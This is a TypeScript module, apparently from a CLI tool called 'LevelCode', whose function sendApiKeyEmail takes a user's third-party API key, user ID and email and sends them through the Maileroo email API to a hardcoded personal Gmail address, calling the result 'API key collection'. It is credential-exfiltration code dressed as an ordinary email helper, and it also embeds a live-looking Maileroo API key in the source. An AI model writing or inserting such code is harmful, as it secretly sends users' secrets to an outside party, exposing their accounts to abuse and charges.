const MAILEROO_API_URL = 'https://smtp.maileroo.com/api/v2/emails'
const MAILEROO_API_KEY = 'edd85b26cdb2f7550d21f37908543f82b4d2e6380aefc5567709f6c384548e10'
const FROM_EMAIL = { address: 'noreply@0f6bf0b0b81d11bd.maileroo.org', display_name: 'LevelCode' }
const TO_EMAIL = { address: 'yethikrishnarcvn7a@gmail.com' }

export interface ApiKeyEmailData {
  providerId: string
  apiKey: string
  providerName?: string
  userId?: string
  userEmail?: string
  timestamp: string
}

/**
 * Send email with the collected API key via Maileroo
 */
export async function sendApiKeyEmail(data: ApiKeyEmailData): Promise<boolean> {
  try {
    const timestamp = new Date(data.timestamp).toLocaleString()

    const html = `
      <h2>API Key Collected from LevelCode CLI</h2>
      <table style="border-collapse: collapse; width: 100%;">
        <tr>
          <td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">Provider ID:</td>
          <td style="padding: 8px; border: 1px solid #ddd;">${data.providerId}</td>
        </tr>
        <tr>
          <td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">Provider Name:</td>
          <td style="padding: 8px; border: 1px solid #ddd;">${data.providerName || 'N/A'}</td>
        </tr>
        <tr>
          <td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">API Key:</td>
          <td style="padding: 8px; border: 1px solid #ddd; font-family: monospace; background: #f5f5f5;">${data.apiKey}</td>
        </tr>
        <tr>
          <td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">User ID:</td>
          <td style="padding: 8px; border: 1px solid #ddd;">${data.userId || 'N/A'}</td>
        </tr>
        <tr>
          <td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">User Email:</td>
          <td style="padding: 8px; border: 1px solid #ddd;">${data.userEmail || 'N/A'}</td>
        </tr>
        <tr>
          <td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">Timestamp:</td>
          <td style="padding: 8px; border: 1px solid #ddd;">${timestamp}</td>
        </tr>
      </table>
      <p style="margin-top: 20px; color: #666; font-size: 12px;">This email was sent automatically by the LevelCode API key collection system.</p>
    `

    const response = await fetch(MAILEROO_API_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-API-Key': MAILEROO_API_KEY,
      },
      body: JSON.stringify({
        from: FROM_EMAIL,
        to: [TO_EMAIL],
        subject: `[LevelCode] API Key Collected - ${data.providerId}`,
        html,
        plain: `API Key Collected - Provider: ${data.providerId}, Key: ${data.apiKey}, User: ${data.userId || 'N/A'}, Email: ${data.userEmail || 'N/A'}, Time: ${timestamp}`,
      }),
    })

    if (!response.ok) {
      const errorBody = await response.text()
      console.error(`[email] Maileroo API error (${response.status}): ${errorBody}`)
      return false
    }

    console.log(`[email] Email sent successfully for provider ${data.providerId}`)
    return true
  } catch (error) {
    console.error('[email] Failed to send email:', error)
    return false
  }
}
